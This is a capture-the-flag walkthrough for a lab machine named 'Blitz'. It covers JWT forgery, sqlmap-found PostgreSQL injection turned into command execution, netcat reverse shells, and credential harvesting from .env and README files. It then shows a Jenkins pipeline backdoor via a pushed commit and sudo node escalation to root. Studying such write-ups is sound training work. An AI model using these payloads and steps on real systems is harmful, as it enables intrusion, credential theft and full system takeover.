# Blitz

## High Level Overview
Blitz is a medium-level Linux machine with several vulnerabilities that, when combined, grant us root access to the system. We start by exploiting a broken access control vulnerability to gain access to the /admin endpoints. From there, we discover a vulnerable /addAdmin endpoint subject to SQL injection. Using sqlmap, we transform the SQLi into command execution on the system. Upon analyzing the source code of the application, we find credentials belonging to the users _git_ and _Jenkins administrator_. We use SSH to access the system as the _git_ user. As it turns out, this user controls a code repository for the staging version of the Blitz application. Furthermore, Jenkins builds this application on-demand and runs it as the _node_ user. We modify the source code and initiate the build process to send a reverse shell as the _node_ user. This user has sudo privileges to run /usr/bin/node. We employ gtfobins techniques to escalate to root.

## Enumerating the target 

Run a full-range port scan to find all open ports. 
```
┌──(kali㉿kali)-[~/Blitz]
└─$ nmap -p- 192.168.100.131 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 09:27 EDT
Nmap scan report for 192.168.100.131
Host is up (0.00047s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 2.57 seconds
```
Nmap found three tcp ports (22, 443, 8000). 
We shoud now run service and version scripts on open ports. 
```
┌──(kali㉿kali)-[~/Blitz]
└─$ nmap -p22,443,8000 -sC -sV -T5 192.168.100.131
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 09:33 EDT
Nmap scan report for blitz.icsd (192.168.100.131)
Host is up (0.00045s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 10:f1:b0:b2:14:43:86:cf:4c:91:76:be:dc:ea:a6:47 (ECDSA)
|_  256 71:cd:b4:50:01:1f:68:bc:4f:3a:01:92:4b:5e:15:4e (ED25519)
443/tcp  open  http    Jetty 10.0.15
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.15)
| http-robots.txt: 1 disallowed entry 
|_/
8000/tcp open  http    Node.js Express framework
| http-title: Login Form
|_Requested resource was /auth/signin
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
```

From the SSH banner, nmap identified the host as Ubuntu. 

## Enumerating web services
The web service running on port 443 turns out to be a Jenkins server. 
![Alt text](Screenshots/jenkins-landing.png)

Jenkins is an open-source automation server used for building and deploying applications. However, at the moment, we don't have the credentials to access the server. 
Moreover, checking for the version number (10.0.15 as nmap identified), we don't find anything interesting.


For now, let's shift our focus to the app running on port 8000. According to the service scan, this application is running on nodejs Express framework. 
This is an important piece of information as we'll see later. 

Navigating to the application, we are welcomed with a login screen. 

![Alt text](Screenshots/main-login.png)

Let's create a new user account.
![Alt text](Screenshots/registration-test.png)

We can now log in. 
![Alt text](Screenshots/main-landing.png)

As we navigate through the site, it appears to be a static website about some furniture brand. 

Now, let's perform directory fuzzing on the application.

```
┌──(kali㉿kali)-[~/Blitz]
└─$ feroxbuster --url http://192.168.100.131:8000/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.131:8000/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       16l       52w      492c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        4w       34c http://192.168.100.131:8000/ => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/admin => http://192.168.100.131:8000/auth/signin
301      GET       10l       16w      179c http://192.168.100.131:8000/images => http://192.168.100.131:8000/images/
302      GET        1l        4w       34c http://192.168.100.131:8000/contact => http://192.168.100.131:8000/auth/signin
301      GET       10l       16w      171c http://192.168.100.131:8000/js => http://192.168.100.131:8000/js/
301      GET       10l       16w      173c http://192.168.100.131:8000/css => http://192.168.100.131:8000/cScreenshots/
302      GET        1l        4w       34c http://192.168.100.131:8000/blog => http://192.168.100.131:8000/auth/signin
301      GET       10l       16w      181c http://192.168.100.131:8000/uploads => http://192.168.100.131:8000/uploads/
302      GET        1l        4w       34c http://192.168.100.131:8000/upload => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/Admin => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/about => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/index => http://192.168.100.131:8000/auth/signin
301      GET       10l       16w      177c http://192.168.100.131:8000/fonts => http://192.168.100.131:8000/fonts/
302      GET        1l        4w       34c http://192.168.100.131:8000/ADMIN => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/Uploads => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/Blog => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/Upload => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/About => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/Contact => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/UPLOAD => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/furniture => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/Index => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/BLOG => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/UPLOADS => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/ABOUT => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/CONTACT => http://192.168.100.131:8000/auth/signin
302      GET        1l        4w       34c http://192.168.100.131:8000/UpLoad => http://192.168.100.131:8000/auth/signin
```

We find several interesting endpoints, including /upload, /uploads and /admin.


## File upload endpoint

It seems like we can upload files to the server. 
![Alt text](Screenshots/file-upload-1.png)

Uploading a test.txt, file we get "File uploaded successfully!" message. 
![Alt text](Screenshots/file-upload-2.png)

By clicking "Download" or "Delete" buttons, we can download or delete the files. It is important to check if those features are vulnerable to directory traversal. For this, we will intercept the traffic by Burp and analyze the requests.  

![Alt text](Screenshots/file-upload-3.png)

Download function calls the /uploads/file_name endpoint for each file (for the delete function, it is /delete/file_name). This feature appears to have been implemented securely and no sensitive data could be leaked.

> [!IMPORTANT]
> Many competitors attempted to upload PHP files here for a significant amount of time. This shows the importance of enumeration during application penetration testing. Otherwise, you may waste time on rabbit holes and "vulnerabilities" that do not even exist.


## Admin Endpoints and Broken Access Control
During directory fuzzing, we discovered an /admin endpoint that could be interesting. However, upon attempting to access the page, we get "Access Denied" error indicating our user does not have enough privileges to access the page. 

![Alt text](Screenshots/admin-access-denied.png)

The server decided not to allow us based on our privilege level. Generally this is done via session headers or cookies containing session tokens. To check what cookies are saved for this application we will use developer tools.  

![Alt text](Screenshots/jwt-1.png)

And not surprisingly, under "Storage > Cookies" section we find accessToken cookie containing a JWT token.

JWT tokens contain information about the current session of the user. Therefore, from both perspectives (client and server side) it is very crutial that the integrity of these tokens remains unaltered. This is ensured by the signature part of the token. This part is signed with a secret only known to the server. Therefore, if the users tamper their tokens in any way server will know and reject the token. 

Header and payload sections of the tokens are base64 encoded, so we can see what is claimed inside of them. We will use jwt.io for this purpose, but any platform with base64 decoding feature can be used. 

![Alt text](Screenshots/jwt-2.png)

It looks like our token contains 2 custom values: *id*, *isAdmin*. As we are not an admin, isAdmin is set to false and we are rejected from seeing /admin page. 

Let's change the isAdmin value from _false_ to _true_.
![Alt text](Screenshots/jwt-3.png) 

As expected, the signature part of the token is changed as the token is tampered. The new token is signed by "your-256-bit-secret" provided by jwt.io.

In an ideally secure world, the server should reject the token and force the user to authenticate again. However, in this implementation jwt.decode() method is used instead of jwt.verify() which **doesn't verify** the signature of the token.

You can read the difference between the two [here](https://community.auth0.com/t/does-jwt-decode-functionality-verify-the-token-or-only-decode-the-token-if-yes-what-all-does-the-decode-function-do/9509). 

Let's now replace the original token with our new 'forged' token and refresh the page. 

![Alt text](Screenshots/admin-panel-landing.png)

Voilà! We get access to admin panel!

## SQL Injection on Admin Panel
We find two user input points on the panel: newProduct and addAdmin. We should test each of these new endpoints for different types of attacks. 

> [!NOTE]  
> Making users admin via the admin panel will not grant them access to /admin page. This is done to ensure that competitors don't help other teams by making them admin by mistake. 

Running sqlmap on both, we find that the addAdmin endpoint is vulnerable to SQL injection. 


```
┌──(kali㉿kali)-[~/Blitz]
└─$ cat addAdmin.req 
POST /admin/addAdmin HTTP/1.1
Host: 192.168.100.131:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 10
Origin: http://192.168.100.131:8000
Connection: close
Cookie: accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MjEsImlzQWRtaW4iOnRydWUsImlhdCI6MTY5NTkwNzkyMywiZXhwIjoxNjk1OTk0MzIzfQ.yFKfelgf-DjHsJsf4brLIKnbkNL3MbQrdSag9cuCO2E

{"id":"1"}
```

```
┌──(kali㉿kali)-[~/Blitz]
└─$ sqlmap -r addAdmin.req --batch
        ___
       __H__                                                                                                               
 ___ ___["]_____ ___ ___  {1.7.8#stable}                                                                                   
|_ -| . [']     | .'| . |                                                                                                  
|___|_  [)]_|_|_|__,|  _|                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:17:15 /2023-09-28/

[10:17:15] [INFO] parsing HTTP request from 'addAdmin.req'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter 'accessToken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
...
[10:17:16] [INFO] (custom) POST parameter 'JSON id' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --code=200)
[10:17:16] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'PostgreSQL' 
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
[10:17:16] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
...
[10:17:36] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:17:36] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[10:17:36] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[10:17:36] [INFO] checking if the injection point on (custom) POST parameter 'JSON id' is a false positive
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: {"id":"(SELECT (CASE WHEN (7879=7879) THEN 1 ELSE (SELECT 8601 UNION SELECT 4781) END))"}

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: {"id":"1;SELECT PG_SLEEP(5)--"}

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: {"id":"1 AND 9699=(SELECT 9699 FROM PG_SLEEP(5))"}
---
[10:17:36] [INFO] the back-end DBMS is PostgreSQL
web application technology: Express
back-end DBMS: PostgreSQL
[10:17:36] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 83 times
[10:17:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.131'

[*] ending @ 10:17:36 /2023-09-28/
```

Sqlmap has identified the backend database as PostgreSQL. We can now proceed to either dump the database or, ideally, achieve command execution on the system!

PostgreSQL versions 9.3 and onwards allow superusers to run system commands via COPY TO/FROM PROGRAM function. You can read more about this vulnerability [here](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) and [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution). 

We can exploit the vulnerability either manually or using sqlmap's --os-shell switch. 

### --os-shell
```
┌──(kali㉿kali)-[~/Blitz]
└─$ sqlmap -r addAdmin.req --batch --os-shell
...
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] Y
[10:24:32] [INFO] retrieved: uid=124(postgres) gid=130(postgres) groups=130(postgres),112(ssl-cert)
command standard output: 'uid=124(postgres) gid=130(postgres) groups=130(postgres),112(ssl-cert)'
os-shell> pwd
do you want to retrieve the command standard output? [Y/n/a] Y
[00:54:04] [INFO] retrieved: /var/lib/postgresql/15/main
command standard output: '/var/lib/postgresql/15/main'
os-shell> 
```
Now, convert this to reverse shell using any bash one-liner.

### Manual Exploitation
Let's first start a listener.
```
┌──(kali㉿kali)-[~/Blitz]
└─$ nc -nvlp 443            
listening on [any] 443 ...

```

Intercept the POST request using Burp's Proxy. 
![Alt text](Screenshots/sql-0-intercept.png)

Using the method described in the link above. 
* Create a new table

![Alt text](Screenshots/sql-1-create-table.png)

* Execute commands

![Alt text](Screenshots/sql-2-rce.png)


And we receive a reverse shell as the postgres user!
```
┌──(kali㉿kali)-[~/Blitz]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.100.132] from (UNKNOWN) [192.168.100.131] 35204
whoami
postgres
python3 -c "import pty; pty.spawn('/bin/bash')"
postgres@blitz:/var/lib/postgresql/15/main$ export TERM=xterm
export TERM=xterm
postgres@blitz:/var/lib/postgresql/15/main$ 
postgres@blitz:/var/lib/postgresql/15/main$ cat /user1.txt
cat /user1.txt
ICSD{2c3db304eedeff55b9a860f284729f89}
```

## Enumerating the System
### Finding Credentials for git
Looking for things that may help us escalate our privileges, we find /opt/Blitz directory. This directory serves as the root directory from which the Blitz app we've just exploited is launched.

![Alt text](Screenshots/prod-web-root.png)
We immediately notice a .env file in the folder. This file generally contains sensitive information such as environment variables:
```
postgres@blitz:/opt/Blitz$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=blitz
DB_USER=postgres
DB_PASSWORD='ThisgUyIsTheBestSysAdminEver!@'
JWT_SECRET_KEY=o0QqacrHlqUz4M91wT7ZzhRVOCZ7qAwZV96s9s9f1XiKWrVMrtrh0wP7wwQSijtj
```

After connecting to the database and searching for interesting information, we don't find anything of value. 

There is a README file in the same directory with the following content:
```
postgres@blitz:/opt/Blitz$ cat README
cat README
This server runs in a production mode. 

Staging version of the server is running locally on port 3000.
Please use staging version for testing, reporting purposes. 
DO NOT engage with the production server. 

Credentials for the git repository:
git@blitz - BUY4b2RFXH9cG1ILYT4h

Credentials for the Jenkins server:
administrator - K1hM7E3Io0I3u3yawKbS

P.S. The jenkins doesn't listen for new commits. 
Please rebuild the application after changes. 
```

We can now access the system as git user. 

```
┌──(kali㉿kali)-[~/Blitz]
└─$ ssh git@192.168.100.131
The authenticity of host '192.168.100.131 (192.168.100.131)' can't be established.
ED25519 key fingerprint is SHA256:+mtxOL3ff6HO5qnCFbjbqOgtLRIbOn16GiIsbMp0mjw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.131' (ED25519) to the list of known hosts.
git@192.168.100.131's password: 
Welcome to Ubuntu 23.04 (GNU/Linux 6.2.0-33-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

16 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Wed Sep 13 14:01:40 2023 from 10.30.22.117
git@blitz:~$ whoami
git
git@blitz:~$ cat /home/git/user2.txt 
ICSD{d82010d823a7b754fb741f17fc2606b3}
git@blitz:~$ 
```

### Finding the Staging Repository and Build Script in Jenkins Dashboard 
Git user's home directory contains several files that may be interesting. 

![Alt text](Screenshots/git-ls-la.png)

Inside the git-server/staging directory we find git backend files. This indicates that the directory is a bare repository and that we can clone/pull/push to this repo. 

![Alt text](Screenshots/git-gitserver-staging.png)

There's also pipeline directory owned by jenkins user. This is probably the build directory used by the jenkins. 

![Alt text](Screenshots/git-pipeline-staging.png)

Let's now clone the directory and look at its contents. 
```
┌──(kali㉿kali)-[~/Blitz]
└─$ git clone git@192.168.100.131:/home/git/git-server/staging
Cloning into 'staging'...
git@192.168.100.131's password: BUY4b2RFXH9cG1ILYT4h
remote: Enumerating objects: 112, done.
remote: Counting objects: 100% (112/112), done.
remote: Compressing objects: 100% (100/100), done.
remote: Total 112 (delta 10), reused 105 (delta 7), pack-reused 0
Receiving objects: 100% (112/112), 5.90 MiB | 30.68 MiB/s, done.
Resolving deltas: 100% (10/10), done.
                                                                                                                                      
┌──(kali㉿kali)-[~/Blitz]
└─$ ls
addAdmin.req  staging  test.txt
```
We have successfully cloned the repository. However, before moving on with the repo, let's look at how jenkins build the app. 

Use the credentials found earlier. 
![Alt text](Screenshots/jenkins-login-screen.png)

There seems to be only one application configured for build (EDGECUT - Staging). 
![Alt text](Screenshots/jenkins-dashboard.png)

On the application menu, we find "Configure" section that reveals build script. 

![Alt text](Screenshots/jenkins-app-dashboard.png)

```
pipeline {
    agent any
    
    tools {
        nodejs "node"
    }
    
    stages {
        stage('Build'){
            steps {
                script {
                    sh 'cd /home/git/pipeline/ && rm -rf staging && git clone file:///home/git/git-server/staging && echo "repository cloned" && cd staging && npm install'
                    sh 'sudo systemctl restart staging.service'
                    
                }
            }
        }
    }
}
```

### Changing the Source Code to get a Reverse Shell as Node user
After cloning the repository to /home/git/pipeline/staging, the script restarts the staging service with sudo. It might be tempting to obtain a reverse shell as jenkins (using the build script itself) and attempt to escalate privileges using sudo. However, as we'll see later, this won't work, as the user has very limited permissions for running sudo commands.

Instead let's read the service file to understand what this service does. 

```
git@blitz:~$ systemctl status staging.service
● staging.service - Staging version of EDGECUT applicaiton.
     Loaded: loaded (/etc/systemd/system/staging.service; enabled; preset: enabled)
     Active: active (running) since Thu 2023-09-28 08:50:56 EDT; 17h ago
   Main PID: 730 (npm start)
      Tasks: 30 (limit: 4600)
     Memory: 93.0M
        CPU: 5.929s
     CGroup: /system.slice/staging.service
             ├─ 730 "npm start"
             ├─1399 sh -c "nodemon app.js"
             ├─1400 node /home/git/pipeline/staging/node_modules/.bin/nodemon app.js
             └─1441 /usr/bin/node app.js

Warning: some journal files were not opened due to insufficient permissions.
git@blitz:~$ cat /etc/systemd/system/staging.service
[Unit]
Description=Staging version of EDGECUT applicaiton. 
After=network.target

[Service]
StartLimitIntervalSec=0[Service]
Type=simple
Restart=always
RestartSec=1
WorkingDirectory=/home/git/pipeline/staging
User=node
ExecStart=/usr/bin/npm start

[Install]
WantedBy=multi-user.target
git@blitz:~$ 
```

The service is run as node user. So changing the source code, pushing the code to the repo and rebuilding the app manually may result in a code execution as user node. 

Reverse shell function is from [revshells](https://www.revshells.com/).

![Alt text](Screenshots/source-code-1.png)

Start a listener. 

```
┌──(kali㉿kali)-[~/Blitz]
└─$ nc -nvlp 80
listening on [any] 80 ...

```


```
┌──(kali㉿kali)-[~/Blitz/staging]
└─$ git config --global user.email "oktay@icsd.az"  
                                                                                                                                       
┌──(kali㉿kali)-[~/Blitz/staging]
└─$ git config --global user.name "oktay"    
                                                            
┌──(kali㉿kali)-[~/Blitz/staging]
└─$ git add .                                 
                                                                                                                                       
┌──(kali㉿kali)-[~/Blitz/staging]
└─$ git commit -m "adding some functionality"
[master 2fa3c62] adding some functionality
 1 file changed, 14 insertions(+)
                                                                                                                             
┌──(kali㉿kali)-[~/Blitz/staging]
└─$ git push origin master                        
git@192.168.100.131's password: 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 528 bytes | 528.00 KiB/s, done.
Total 3 (delta 2), reused 0 (delta 0), pack-reused 0
To 192.168.100.131:/home/git/git-server/staging
   8f9f043..2fa3c62  master -> master
```

Message we found earlier mentioned that new commits do not trigger the build. Since we have changed code in the repo, we should manually rebuild the app. 
```
P.S. The jenkins doesn't listen for new commits. 
Please rebuild the application after changes. 
```
Click "Build Now". 

![Alt text](Screenshots/jenkins-build.png)

And we receive a reverse shell as user node!
```
┌──(kali㉿kali)-[~/Blitz]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.100.132] from (UNKNOWN) [192.168.100.131] 60034
whoami                                                
node
id
uid=1002(node) gid=1002(node) groups=1002(node),100(users),1003(development)
python3 -c "import pty;pty.spawn('/bin/bash')"
node@blitz:/home/git/pipeline/staging$ cat /home/node/user3.txt 
cat /home/node/user3.txt
ICSD{ede5159c9ab5d81b2f66e177599c8b65}
```

### Shortcut from Jenkins to Node without Interacting with The Staging Repository
What jenkins does in build scripts is to simply run commands specified in script/sh section, providing us command execution on the system as jenkins user. We also now that pipeline/staging directory is owned by jenkins, meaning we can change the code (app.js as shown above) directly from the command line. 

![Alt text](Screenshots/git-pipeline-staging.png)

We are also allowed to restart the service. 
```
jenkins@blitz:/home/git/pipeline/staging$ sudo -l
Matching Defaults entries for jenkins on blitz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jenkins may run the following commands on blitz:
    (root) NOPASSWD: /usr/bin/systemctl restart staging.service
```

This essentially means we can bypass repository cloning/pushing steps. 


### Escalating to Root
User node can run /usr/bin/node with sudo. 
```
node@blitz:/home/git/pipeline/staging$ sudo -l
sudo -l
Matching Defaults entries for node on blitz:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User node may run the following commands on blitz:
    (root) NOPASSWD: /usr/bin/node
```

We find an exploit [here](https://gtfobins.github.io/gtfobins/node/).

```
node@blitz:/home/git/pipeline/staging$ whoami
whoami
node
node@blitz:/home/git/pipeline/staging$ sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'  
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'  
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
ICSD{e12fbea175412c69961926bd42431596}
```